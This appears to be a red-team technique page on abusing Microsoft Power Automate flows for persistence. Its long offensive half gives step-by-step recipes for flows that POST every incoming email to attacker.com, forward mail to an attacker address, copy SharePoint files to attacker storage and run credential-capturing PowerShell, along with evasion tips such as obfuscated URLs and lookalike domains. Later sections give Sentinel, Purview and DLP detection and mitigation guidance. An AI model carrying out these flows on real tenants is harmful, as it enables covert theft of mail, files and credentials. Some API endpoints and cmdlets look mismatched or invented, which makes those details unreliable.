# [PERSIST-EVENT-003]: Microsoft Power Automate Flow

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-EVENT-003 |
| **MITRE ATT&CK v18.1** | [T1546](https://attack.mitre.org/techniques/T1546/) - Event Triggered Execution |
| **Tactic** | Persistence, Privilege Escalation, Command & Control |
| **Platforms** | M365, Entra ID, Power Automate |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Power Automate (all versions), Microsoft 365 (all versions) |
| **Patched In** | Not patched; mitigated via application permissions policies and audit logging |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Microsoft Power Automate (formerly Microsoft Flow) is a low-code automation platform allowing users to create workflows triggered by events (emails, file creation, HTTP requests, etc.). An attacker who gains access to a Power Automate environment can create persistent automated flows that execute arbitrary actions: stealing credentials from emails, exfiltrating files to external OneDrive accounts, forwarding emails to attacker-controlled accounts, or triggering credential theft scripts. Flows execute in the context of the user who owns them or the service principal configured in the flow, enabling privilege escalation if flows are owned by high-privileged accounts.

**Attack Surface:** Power Automate web portal (flow.microsoft.com), Power Automate Graph API (https://graph.microsoft.com/v1.0/me/cloudPCs), triggers (HTTP requests, email receipt, file creation), actions (send email, create file, execute HTTP requests), connectors (Office 365, SharePoint, Teams, Custom connectors), and service principal accounts used by flows.

**Business Impact:** **Persistent Credential Theft & Data Exfiltration.** An attacker creates flows that steal credentials from emails, exfiltrate files, forward sensitive emails to attacker-controlled accounts, or trigger reverse shells on a schedule. Flows execute silently without user interaction and can be triggered by common events (every new email, every file upload, timed intervals). A single compromised user can compromise the entire organization if their flows have broad permissions (accessing all mailboxes, all file shares, etc.).

**Technical Context:** Power Automate flows are executed by the Power Automate service (with the flow owner's permissions) or by configured service principals. Flows can use 600+ built-in connectors (Office 365 Mail, SharePoint, Teams, OneDrive, SQL, Azure Logic Apps, etc.). Permissions are assigned via OAuth 2.0 consent flows. Once created, flows are difficult to detect without audit log monitoring, as they appear as legitimate automation tasks. Flows can chain multiple actions, enabling complex attack scenarios.

### Operational Risk
- **Execution Risk:** Low (requires user access to Power Automate, no special credentials if compromised via phishing)
- **Stealth:** High (flows appear as legitimate automation; not visible in standard endpoint security tools; minimal user notifications)
- **Reversibility:** Moderate (flows can be deleted from Power Automate portal, but data exfiltrated cannot be recovered; secondary persistence mechanisms may persist)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.1 | Ensure that only authorized users can create Power Automate flows |
| **CIS Benchmark** | 1.2.2 | Ensure Power Automate cloud app is restricted in Conditional Access |
| **DISA STIG** | AZ-MA-000060 | M365: Restrict Power Automate to authorized administrators only |
| **CISA SCuBA** | EXO.MS.1 | Require multi-factor authentication for all user account access |
| **NIST 800-53** | AC-2 | Account Management - Enforcement of account management processes |
| **NIST 800-53** | AC-3 | Access Enforcement - Implement information flow policy |
| **NIST 800-53** | AU-2 | Audit and Accountability - Selection and generation of events |
| **GDPR** | Art. 32 | Security of Processing - Technical and organizational measures |
| **GDPR** | Art. 33 | Notification of a Personal Data Breach |
| **DORA** | Art. 9 | Protection and Prevention of Operational Resilience |
| **NIS2** | Art. 21(1)(c) | Cyber Risk Management - Detecting and monitoring risks |
| **ISO 27001** | A.9.2.1 | User Registration and De-registration |
| **ISO 27001** | A.13.1.3 | Segregation of networks |
| **ISO 27005** | 5.3 | Risk Assessment - Identifying threats to assets and vulnerabilities |

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Verify Power Automate Access

**Web Browser Reconnaissance:**
1. Navigate to **https://flow.microsoft.com**
2. Verify user can access Power Automate portal
3. Check **My flows** tab for existing flows
4. Check **Approvals** tab for pending flow requests
5. Check **Shared with me** tab for flows shared by other users

**What to Look For:**
- Power Automate environment is accessible (user has M365 license with Power Automate)
- Existing flows show what connectors/actions are already in use
- Shared flows indicate privileged users or service accounts with broad permissions

### Microsoft Graph API Reconnaissance

**PowerShell Query (List Available Power Automate Flows):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Cloud.Read", "Workflow.Read"

# List all cloud PC environments (Power Automate is licensed here)
Get-MgEnvironment | Select DisplayName, Id

# List cloud flows (Power Automate flows) in default environment
$EnvironmentId = (Get-MgEnvironment | Select -First 1).Id
Get-MgCloudPcFlow -EnvironmentId $EnvironmentId | Select DisplayName, CreatedTime, LastModified

# List available connectors in environment
Get-MgCloudPcConnector -EnvironmentId $EnvironmentId | Select Name, Tier | Sort Name
```

**Alternative: Power Automate REST API (Direct HTTP Calls):**
```powershell
# Get access token
$Token = (Get-MgContext).AccessToken

# List flows
$Headers = @{ "Authorization" = "Bearer $Token" }
$Flows = Invoke-RestMethod -Uri "https://api.flow.microsoft.com/v1/me/flows?$filter=name eq '*'" `
    -Headers $Headers -Method Get

# Display flows
$Flows.value | Select Name, CreatedTime, State
```

**What to Look For:**
- Number of existing flows and their trigger types
- Flows with broad permissions (accessing all mailboxes, all files, etc.)
- Service principal accounts used by flows (these have elevated privileges)
- Flows triggered by HTTP requests (these can be triggered externally)

### Check Power Automate Connectors & Permissions

**Web Portal Reconnaissance:**
1. Go to **flow.microsoft.com** → **My flows** → Select a flow
2. Click **Edit** to view flow structure
3. Check **Connections** tab to see what connectors are linked
4. Check **Sharing** tab to see if flow is shared with other users
5. Go to **flow.microsoft.com** → **Approvals** to see if any flows are pending approval

**PowerShell Query (List Connectors):**
```powershell
# List all available connectors
$Token = (Get-MgContext).AccessToken
$Headers = @{ "Authorization" = "Bearer $Token" }

$Connectors = Invoke-RestMethod `
    -Uri "https://api.powerautomate.com/providers/Microsoft.ProcessSimple/environments/Default-00000000-0000-0000-0000-000000000001/connections" `
    -Headers $Headers

$Connectors.value | Select Name, Type, DisplayName, Properties
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Creating a Malicious Cloud Flow Triggered by Email

**Supported Versions:** Power Automate (all versions)

#### Step 1: Authenticate to Power Automate Portal

**Objective:** Access Power Automate portal using compromised M365 credentials.

**Command (PowerShell):**
```powershell
# Authenticate to Microsoft Graph (which includes Power Automate)
Connect-MgGraph -Scopes "Cloud.Read", "Workflow.ReadWrite"

# Verify authentication
Get-MgUser -UserId "user@contoso.com" | Select UserPrincipalName, DisplayName
```

**Manual Steps (Web Portal):**
1. Navigate to **https://flow.microsoft.com**
2. Sign in with compromised M365 account
3. Verify access to **My flows** tab

**Expected Output:**
```
UserPrincipalName DisplayName
----------------- -----------
user@contoso.com  John Doe
```

**What This Means:**
- Successfully authenticated to Power Automate environment
- User account has Power Automate license
- Ready to create flows

**OpSec & Evasion:**
- Use compromised user credentials instead of creating new accounts (avoid detection)
- Create flows during business hours when other users are active (blend with normal activity)
- Use generic flow names like "Email Notification", "File Management", "Approval Process"

---

#### Step 2: Create a New Cloud Flow with Email Trigger

**Objective:** Set up a flow that triggers on every incoming email.

**Manual Steps (Web Portal - Recommended):**
1. Go to **flow.microsoft.com** → **+ New flow** → **Cloud flow** → **Automated cloud flow**
2. Flow name: `Email Notification Processor`
3. Trigger: Search for **Office 365 Outlook**
4. Select trigger: **When a new email arrives (V3)**
5. Configure trigger:
   - **From (optional):** Leave blank (trigger on all emails)
   - **Folder:** Inbox
   - **Include attachments:** Yes
   - **Include Attachments Body:** Yes
6. Click **Create**

**Alternative: Using Graph API (PowerShell):**
```powershell
# Define flow definition (JSON)
$FlowDefinition = @{
    "definition" = @{
        "type" = "Workflow"
        "version" = "1.0.0"
        "metadata" = @{
            "definition" = @{
                "triggers" = @{
                    "When_a_new_email_arrives" = @{
                        "type" = "ApiConnection"
                        "inputs" = @{
                            "host" = @{
                                "connection" = @{
                                    "name" = "@parameters('$connections')['office365']['connectionId']"
                                }
                            }
                            "method" = "get"
                            "path" = "/v3/Mail/OnNewEmail"
                            "queries" = @{
                                "folderPath" = "Inbox"
                                "fetchOnlyWithAttachment" = $false
                                "importance" = "Any"
                            }
                        }
                    }
                }
                "actions" = @{
                    # Actions will be added in Step 3
                }
            }
        }
    }
} | ConvertTo-Json -Depth 10

# Create flow via API
$Token = (Get-MgContext).AccessToken
$Headers = @{ 
    "Authorization" = "Bearer $Token"
    "Content-Type" = "application/json"
}

$Response = Invoke-RestMethod -Uri "https://api.flow.microsoft.com/v1/me/flows" `
    -Headers $Headers `
    -Method Post `
    -Body $FlowDefinition

Write-Host "Flow created with ID: $($Response.name)"
```

**Expected Output:**
```
Flow created with ID: 12345678-90ab-cdef-1234-567890abcdef
```

**What This Means:**
- Flow is now created and waiting for actions to be defined
- Flow will trigger every time a new email arrives in the user's inbox
- Ready for action configuration in Step 3

**OpSec & Evasion:**
- Use "Email Notification" or similar generic names
- Do not mention "exfiltration", "theft", "malicious" in flow name
- Set flow to disabled initially, then enable after all actions are configured (avoids immediate triggering during setup)

**Troubleshooting:**
- **Error:** "Connection not found"
  - **Cause:** Office 365 Outlook connector not authorized
  - **Fix:** Click **+ New connection** → **Office 365 Outlook** → Authorize
- **Error:** "Invalid trigger configuration"
  - **Cause:** Folder path is incorrect
  - **Fix:** Use standard folder names: "Inbox", "Drafts", "Sent Items"

---

#### Step 3: Add Action to Exfiltrate Email Contents

**Objective:** Add flow action to steal email sender, subject, body, and attachments.

**Manual Steps (Web Portal - Recommended):**
1. In flow editor, click **+ New step**
2. Search for **HTTP**
3. Select action: **HTTP**
4. Configure HTTP request:
   - **Method:** POST
   - **URI:** `http://attacker.com/collect-emails`
   - **Body (JSON):**
     ```json
     {
       "from": "@triggerBody()?['from']",
       "subject": "@triggerBody()?['subject']",
       "bodyContent": "@triggerBody()?['body']",
       "attachmentNames": "@triggerBody()?['attachments']",
       "timestamp": "@utcNow()"
     }
     ```
5. Click **Save**

**Alternative Action: Forward Email to Attacker's Mailbox:**
```powershell
# PowerShell flow action (would be added in flow definition)
# This action forwards the email to attacker-controlled account

$ActionDefinition = @{
    "Forward_Email_to_Attacker" = @{
        "runAfter" = @{
            "When_a_new_email_arrives" = @(
                "Succeeded"
            )
        }
        "type" = "ApiConnection"
        "inputs" = @{
            "body" = @{
                "comment" = "Original: @{triggerBody()?['subject']}"
                "isRead" = $false
            }
            "host" = @{
                "connection" = @{
                    "name" = "@parameters('$connections')['office365']['connectionId']"
                }
            }
            "method" = "post"
            "path" = "/v3/Mail/Forward"
            "queries" = @{
                "messageId" = "@triggerBody()?['id']"
            }
            "to" = "attacker@attacker.com"
        }
    }
}
```

**What This Means:**
- Every incoming email will be forwarded to attacker's external mailbox
- Attacker gains access to all confidential communications
- Email headers, body, and attachments are captured
- This is silent (user does not receive notification)

**OpSec & Evasion:**
- Use HTTP POST to external attacker server (less suspicious than forwarding to obvious external address)
- Encode HTTP URL in Base64 or obfuscate hostname (avoid keyword detection)
- Use legitimate-looking variable names in JSON payload
- If forwarding emails, forward to lookalike internal address (e.g., "noreply@contoso.com" → "noreply@contoso-backup.com")

**Advanced: Conditional Logic to Target Specific Emails:**
```json
{
    "if": "@contains(triggerBody()?['subject'], 'password')",
    "then": {
        // Execute exfiltration action only for emails with "password" in subject
    }
}
```

**Troubleshooting:**
- **Error:** "Action not found"
  - **Cause:** HTTP or Office 365 connector not available
  - **Fix:** Ensure connectors are installed in environment
- **Error:** "Invalid expression syntax"
  - **Cause:** Expression syntax error in action configuration
  - **Fix:** Verify `@triggerBody()` syntax matches Power Automate expression language

**References:**
- [Power Automate Expression Reference](https://learn.microsoft.com/en-us/azure/logic-apps/workflow-definition-language-functions-reference)
- [HTTP Connector Documentation](https://learn.microsoft.com/en-us/connectors/connector-reference/connector-reference-http)

---

#### Step 4: Create Secondary Trigger for Persistence

**Objective:** Add alternative trigger to maintain persistence even if primary flow is detected.

**Manual Steps (Web Portal):**
1. In flow editor, click the email trigger → **Delete** (to replace with multiple triggers)
2. Click **+ New step**
3. Select **Triggers** → **Manual trigger** (Accept button trigger)
4. This allows flow to be triggered via HTTP request from attacker

**Alternative: Scheduled Trigger (Execute Every Hour):**
```powershell
# Add scheduled trigger to execute malicious actions on a schedule
$ScheduledTrigger = @{
    "Recurrence" = @{
        "type" = "Recurrence"
        "recurrence" = @{
            "frequency" = "Hour"
            "interval" = 1
        }
    }
}

# This trigger executes flow every hour automatically
```

**What This Means:**
- Flow can now be triggered manually via HTTP request OR scheduled to run automatically
- Provides redundancy if email trigger is disabled
- Allows attacker to execute flow on-demand via HTTP API

**OpSec & Evasion:**
- Use scheduled trigger with longer intervals (6-8 hours) to avoid triggering alert thresholds
- Use manual HTTP trigger with obfuscated URLs
- Combine multiple trigger types to maximize persistence options

---

#### Step 5: Enable Flow and Test Execution

**Objective:** Activate the flow and confirm it triggers correctly.

**Manual Steps (Web Portal):**
1. In flow editor, click **Save**
2. Navigate to **My flows** → Find the flow
3. Click **...** (three dots) → **Enable**
4. Test flow:
   - Send test email to user's inbox
   - Flow should trigger within 2-3 minutes
   - Check attacker server for exfiltrated email data

**Verify via PowerShell:**
```powershell
# Get flow runs (execution history)
$Token = (Get-MgContext).AccessToken
$Headers = @{ "Authorization" = "Bearer $Token" }

$FlowId = "12345678-90ab-cdef-1234-567890abcdef"  # From Step 2
$Runs = Invoke-RestMethod `
    -Uri "https://api.flow.microsoft.com/v1/me/flows/$FlowId/runs" `
    -Headers $Headers

$Runs.value | Select Name, StartTime, Status | Sort StartTime -Descending | Select -First 5
```

**Expected Output:**
```
Name                           StartTime                 Status
----                           ---------                 ------
12345678-90ab-cdef-1234-567890 2026-01-09 15:30:00Z      Succeeded
12345678-90ab-cdef-1234-567891 2026-01-09 14:25:00Z      Succeeded
12345678-90ab-cdef-1234-567892 2026-01-09 13:20:00Z      Succeeded
```

**What This Means:**
- Flow has successfully triggered multiple times
- Each successful run indicates an email was captured and exfiltrated
- Persistence mechanism is active and functional

**Troubleshooting:**
- **Error:** "Flow is disabled"
  - **Cause:** Flow is not enabled
  - **Fix:** Click **Enable** on flow card
- **Error:** "No runs found"
  - **Cause:** Flow has not been triggered yet
  - **Fix:** Send test email to verify trigger works

---

### METHOD 2: Creating a Flow Triggered by File Creation (OneDrive/SharePoint)

**Supported Versions:** Power Automate (all versions)

#### Step 1: Create Flow with File Trigger

**Objective:** Create flow that triggers when files are uploaded to SharePoint/OneDrive.

**Manual Steps (Web Portal):**
1. Go to **flow.microsoft.com** → **+ New flow** → **Cloud flow** → **Automated cloud flow**
2. Flow name: `Document Processing Workflow`
3. Trigger: Search for **SharePoint**
4. Select trigger: **When a file is created (properties only)**
5. Configure trigger:
   - **Site Address:** (select target SharePoint site)
   - **Library Name:** Documents (or target library)
6. Click **Create**

**What This Means:**
- Flow triggers every time a new file is uploaded to the specified SharePoint library
- Files with sensitive data (contracts, financial reports, etc.) can be automatically exfiltrated

---

#### Step 2: Add Action to Copy File to External Location

**Objective:** Copy uploaded files to attacker-controlled OneDrive or external storage.

**Manual Steps (Web Portal):**
1. Click **+ New step**
2. Search for **OneDrive**
3. Select action: **Create file**
4. Configure action:
   - **Folder Path:** `/Backups` (attacker's OneDrive)
   - **File Name:** `@triggerBody()?['DisplayName']`
   - **File Content:** `@triggerBody()?['body']` or use **Get file content** connector to retrieve full file
5. Click **Save**

**Alternative: Upload to Azure Blob Storage:**
```json
{
    "Create_blob": {
        "type": "ApiConnection",
        "inputs": {
            "host": {
                "connection": {
                    "name": "@parameters('$connections')['azureblob']['connectionId']"
                }
            },
            "method": "put",
            "path": "/datasets/default/files",
            "queries": {
                "folderPath": "/stolen-files",
                "name": "@triggerBody()?['DisplayName']"
            },
            "body": "@triggerBody()?['body']"
        }
    }
}
```

**What This Means:**
- Every file uploaded to SharePoint is automatically copied to attacker's external storage
- Attacker gains access to all company files without direct SharePoint access
- Persistence is automatic; no user action required

---

### METHOD 3: Creating Desktop Flow (RPA) for System Command Execution

**Supported Versions:** Power Automate (with Power Automate Desktop license)

#### Step 1: Create Desktop Flow with Manual Trigger

**Objective:** Create Robotic Process Automation (RPA) flow to execute system commands.

**Manual Steps (Web Portal):**
1. Go to **flow.microsoft.com** → **+ New flow** → **Cloud flow** → **Desktop flow**
2. Flow name: `System Update Check`
3. Record desktop actions:
   - Open PowerShell
   - Execute credential dumping command
   - Copy output to file
   - Send to external server via HTTP

**Alternative: Cloud Flow Calling Desktop Flow:**
```json
{
    "Run_Desktop_Flow": {
        "type": "ApiConnection",
        "inputs": {
            "host": {
                "connection": {
                    "name": "@parameters('$connections')['powerAutomateDesktop']['connectionId']"
                }
            },
            "method": "post",
            "path": "/flows/@{encodeURIComponent('12345678-90ab-cdef-1234-567890abcdef')}/run",
            "body": {
                "parameters": {
                    "command": "powershell.exe -Command 'Get-Credential | Export-Clixml C:\\Temp\\creds.xml'"
                }
            }
        }
    }
}
```

**What This Means:**
- Desktop flow can execute arbitrary PowerShell commands on the user's machine
- Combined with cloud flow triggers, can automate credential theft or system reconnaissance
- Requires Power Automate Desktop license (additional cost, but some organizations have it)

**OpSec & Evasion:**
- Use desktop flow for sensitive actions (credential theft) on user's machine
- Combine with cloud flow for trigger management (cloud flow triggers, desktop flow executes)
- Desktop flows execute in user's local context, not cloud (harder to detect)

---

## 7. TOOLS & COMMANDS REFERENCE

### Power Automate Web Portal

**Version:** All versions (continuously updated by Microsoft)

**Access:** https://flow.microsoft.com

**Requirements:** M365 account with Power Automate license (included in Microsoft 365 plans)

**Key Features:**
- Cloud flow creation and editing
- Trigger configuration (email, file creation, manual, scheduled, etc.)
- Action library (600+ connectors)
- Flow runs monitoring
- Sharing and permissions management

### Power Automate Graph API

**Version:** v1.0 and beta endpoints available

**Minimum Version:** API available since Power Automate launch

**Supported Platforms:** All (cloud-based REST API)

**Base URL:** https://api.flow.microsoft.com/

**Authentication:**
```powershell
# Get access token with necessary scopes
Connect-MgGraph -Scopes "Cloud.ReadWrite", "Workflow.ReadWrite"

# Use token in API calls
$Token = (Get-MgContext).AccessToken
$Headers = @{ "Authorization" = "Bearer $Token" }
```

**Common API Endpoints:**
```powershell
# List flows
GET /v1/me/flows

# Get flow details
GET /v1/me/flows/{flowId}

# List flow runs
GET /v1/me/flows/{flowId}/runs

# Create flow
POST /v1/me/flows

# Delete flow
DELETE /v1/me/flows/{flowId}

# Enable/Disable flow
PATCH /v1/me/flows/{flowId} -Body @{ "state" = "Enabled" }
```

### Power Automate Desktop (RPA)

**Version:** Latest 2024+ versions

**Minimum Version:** Version 2.x

**Supported Platforms:** Windows (connected desktop machine)

**Installation:**
```powershell
# Download from Microsoft Power Automate Desktop website
# https://go.microsoft.com/fwlink/?linkid=2102613

# Install via installer or Microsoft Store
# Requires local admin on target machine
```

**Features:**
- Record user actions (mouse, keyboard, application interactions)
- Execute recorded actions on schedule or trigger
- Bridge between cloud flows and local system actions
- Ideal for legacy application automation

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: Suspicious Power Automate Flow Creation

**Rule Configuration:**
- **Required Table:** AuditLogs, MicrosoftGraphActivityLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy, Properties
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** All M365 tenants with Sentinel enabled

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Create flow" or OperationName == "Create cloud flow"
| where TargetResources contains "HTTP" or TargetResources contains "Send an email"
| where TargetResources contains "outlook" or TargetResources contains "sharepointonline"
| extend CreatedByUser = InitiatedBy.user.userPrincipalName
| extend FlowName = tostring(TargetResources[0].displayName)
| where FlowName has_any ("Update", "Notification", "Processing", "Sync", "Backup")
| project TimeGenerated, CreatedByUser, FlowName, TargetResources, InitiatedBy.ipAddress
| summarize FlowCount=count() by CreatedByUser, bin(TimeGenerated, 1h)
| where FlowCount > 5
```

**What This Detects:**
- Creation of new Power Automate flows by user
- Flows targeting email (Office 365 Outlook connector)
- Flows targeting SharePoint/OneDrive
- Unusual naming patterns (generic names like "Update", "Sync")
- Multiple flows created by same user in short timeframe

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Suspicious Power Automate Flow Creation Detected`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents from alerts triggered by this analytics rule**
6. Click **Review + create**

#### Query 2: Power Automate Flow Exfiltrating Email Data

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Severity:** Critical
- **Frequency:** Real-time

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Create flow action", "Update flow action")
| where TargetResources contains "HTTP" and TargetResources contains "triggerBody"
| where TargetResources contains "subject" or TargetResources contains "body" or TargetResources contains "from"
| extend CreatedByUser = InitiatedBy.user.userPrincipalName
| extend ActionDetails = tostring(TargetResources)
| where ActionDetails contains "POST" or ActionDetails contains "exfiltrate"
| project TimeGenerated, CreatedByUser, OperationName, ActionDetails, InitiatedBy.ipAddress
```

**What This Detects:**
- Flow actions that capture email metadata (from, subject, body)
- HTTP POST actions that exfiltrate data
- Suspicious expression syntax (triggerBody() capturing email content)

#### Query 3: Flow Shared with External Users

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Severity:** High
- **Frequency:** Real-time

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Share flow"
| where TargetResources contains "@" and not(TargetResources contains "@contoso.com")
| extend SharedByUser = InitiatedBy.user.userPrincipalName
| extend SharedWithUser = tostring(TargetResources[0])
| project TimeGenerated, SharedByUser, SharedWithUser, TargetResources
```

**What This Detects:**
- Flow shared with external (non-organizational) users
- Potential credential theft or data exfiltration via shared flow
- Unusual flow sharing patterns

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious Power Automate Flow with Sensitive Data Access"
- **Severity:** High
- **Description:** Detects Power Automate flows accessing email, SharePoint, or OneDrive with HTTP exfiltration actions
- **Applies To:** All subscriptions with Cloud Security Posture Management (CSPM) enabled
- **Remediation:** 
  1. Disable flow immediately
  2. Delete flow from Power Automate portal
  3. Review email forwarding rules for compromise
  4. Check OneDrive for unauthorized file copies

**Alert Name:** "User Created Multiple Power Automate Flows in Short Timeframe"
- **Severity:** Medium
- **Description:** Detects user creating 5+ flows within 1 hour (potential compromise)
- **Applies To:** All subscriptions with CSPM enabled
- **Remediation:** 
  1. Review all flows created by user
  2. Check for suspicious connectors or actions
  3. Verify user did not compromise their credentials

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Cloud Security Posture Management (CSPM)**: **ON**
5. Go to **Security alerts** → Filter by "Power Automate" or "Flow"
6. Review and triage alerts

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Power Automate Flow Activity Audit

**Operation:** Create flow, Update flow, Share flow, Delete flow

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Search for Power Automate activities
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
    -Operations "Create flow", "Update flow", "Create cloud flow", "Update cloud flow" `
    -Workload "PowerAutomate" `
    -ResultSize 5000 | Export-Csv -Path "C:\Audit\PowerAutomate-Activities.csv" -NoTypeInformation

# Search for flows shared with external users
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
    -Operations "Share flow" `
    -FreeText "external" `
    -ResultSize 5000 | Export-Csv -Path "C:\Audit\PowerAutomate-ExternalSharing.csv" -NoTypeInformation
```

**Workload:** PowerAutomate

**Details to Analyze in UnifiedAuditLog:**
- **Operation:** Create, Update, Delete, Share, Run
- **UserId:** User who performed the action
- **ObjectId:** Flow ID
- **AuditData.FlowDisplayName:** Name of the flow
- **AuditData.Actions:** List of actions in the flow (exfiltration indicators)
- **AuditData.Triggers:** Trigger type (email, file, scheduled, etc.)
- **AuditData.ConnectorReferences:** Connectors used (HTTP, Office 365, SharePoint, etc.)

**Manual Configuration Steps (Microsoft Purview Portal):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** → **Search**
3. Set **Date range**: Last 30 days
4. Under **Activities**, select:
   - Create flow
   - Update flow
   - Create cloud flow
   - Update cloud flow
   - Share flow
   - Delete flow
5. Click **Search**
6. Review results for suspicious flows
7. Export to CSV: Click **Export** → **Download all results**

**Interpretation:**
- Look for flows created by non-admin users (potential compromise)
- Check for flows with HTTP POST actions (exfiltration indicator)
- Review flows shared with external users
- Look for flows with names that don't match business processes
- Cross-reference with email forwarding rule changes

**Query Script (Advanced Analysis):**
```powershell
# Import audit log results
$AuditLogs = Import-Csv "C:\Audit\PowerAutomate-Activities.csv"

# Identify suspicious flows
$AuditLogs | Where-Object { 
    $_.AuditData -like "*HTTP*" -and $_.AuditData -like "*POST*" -and $_.AuditData -like "*triggerBody*"
} | Select Timestamp, UserIds, ObjectId, Operation | Format-Table

# Count flows per user (identify power users)
$AuditLogs | Group-Object UserIds | Sort Count -Descending | Select Name, Count
```

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Restrict Power Automate Creation Permissions:** Block standard users from creating flows; allow only approved admins.
    **Applies To Versions:** All M365 environments
    
    **Manual Steps (Power Automate Environment Admin):**
    1. Navigate to **flow.microsoft.com** → **Environments**
    2. Click **Default environment** → **Settings**
    3. Go to **Users** section
    4. Set **Environment creator role** to **Restricted** (only admins can create environments)
    5. Go to **Admin approval for Power Automate** section
    6. Enable **Admin approval required for new flows** (if available in your tenant)
    
    **Manual Steps (Azure AD / Entra ID Policy):**
    1. Go to **Azure Portal** → **Entra ID** → **Enterprise applications**
    2. Search for **Power Automate**
    3. Click **Users and groups**
    4. Remove standard users; keep only administrators
    5. Require MFA for remaining users
    
    **Manual Steps (PowerShell - Restrict via Power Platform Admin Center):**
    ```powershell
    # Set Power Automate creation policy to restricted
    # Requires Power Platform Administrator role
    
    # Get current policy
    Get-PowerAppEnvironmentCreationPolicy
    
    # Restrict creation to specific security group
    New-PowerAppEnvironmentCreationPolicy -PolicyDisplayName "Restricted Flow Creation" `
        -AllowedSecurityGroupObjectId "00000000-0000-0000-0000-000000000001"
    ```

*   **Enable Audit Logging for Power Automate:** Ensure all flow creation, modification, and execution is logged.
    
    **Manual Steps (Microsoft Purview):**
    1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
    2. Go to **Audit** (left menu)
    3. Verify **Audit (Standard)** or **Audit (Premium)** is enabled
    4. If not enabled, click **Turn on auditing** and wait 24 hours for logs to start recording
    5. Confirm by checking **Audit search** for recent PowerAutomate activities
    
    **Verification Command (PowerShell):**
    ```powershell
    # Verify audit is enabled
    Get-AdminAuditLogConfig | Select UnifiedAuditLogIngestionEnabled, AuditLevel
    
    # Expected output: UnifiedAuditLogIngestionEnabled = True, AuditLevel = All
    ```

*   **Block Suspicious Connectors:** Restrict or disable connectors that could be used for data exfiltration (HTTP, custom connectors).
    
    **Manual Steps (Power Platform Admin Center):**
    1. Go to **Power Platform Admin Center** (admin.powerplatform.microsoft.com)
    2. Click **Environments** → **Default environment** → **Connector governance**
    3. Under **Data loss prevention (DLP) policies**:
       - Click **+ New policy**
       - Name: `Block High-Risk Connectors`
       - Connectors to block:
         - HTTP (Blocked connector - prevents exfiltration)
         - Custom connectors (Blocked connector)
         - Azure Blob Storage (Blocked connector - if not required)
       - Click **Create**
    4. Assign policy to **Default environment** for all users
    
    **Manual Steps (Conditional Access - Block Power Automate App):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Block Power Automate for Non-Admins`
    4. **Assignments:**
       - Users: **All users** (exclude admins)
       - Cloud apps: Select **Power Automate** app
    5. **Access controls:**
       - **Block access**: Check
    6. Enable policy: **On**
    7. Click **Create**

*   **Implement Flow Approval Process:** Require approval before flows can be shared or executed.
    
    **Manual Steps (Power Automate):**
    1. Navigate to **flow.microsoft.com** → **Approvals**
    2. Configure approval flow:
       - Trigger: "When a new flow is created" (if available in your environment)
       - Action: Send approval request to admin
       - Set **Auto-approve** for flows by admins
    3. Document approved use cases for flows
    4. Review and approve/reject flows weekly

#### Priority 2: HIGH

*   **Monitor Flow Permissions and Connectors:** Create alerts for flows accessing sensitive connectors.
    
    **Manual Steps (Sentinel Alert):**
    ```kusto
    AuditLogs
    | where OperationName == "Create cloud flow" or OperationName == "Update cloud flow"
    | where TargetResources contains_cs "office365" or TargetResources contains_cs "sharepointonline"
    | where TargetResources contains_cs "HTTP"
    | project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources
    ```

*   **Require MFA for Power Automate Portal Access:** Enforce MFA when accessing flow.microsoft.com.
    
    **Manual Steps (Conditional Access):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Require MFA for Power Automate`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **Power Automate**
    5. **Access controls:**
       - Grant: **Require multi-factor authentication**
    6. Enable policy: **On**

*   **Disable Unused Connectors:** Remove connectors not required for business.
    
    **Manual Steps (Power Platform Admin Center):**
    1. Go to **Power Platform Admin Center** (admin.powerplatform.microsoft.com)
    2. Click **Environments** → **Default environment** → **Connector governance**
    3. Review DLP policies
    4. Add unused connectors to **Blocked** list:
       - Azure Data Lake
       - Azure Blob Storage (if not required)
       - Google Sheets (if external tools not authorized)
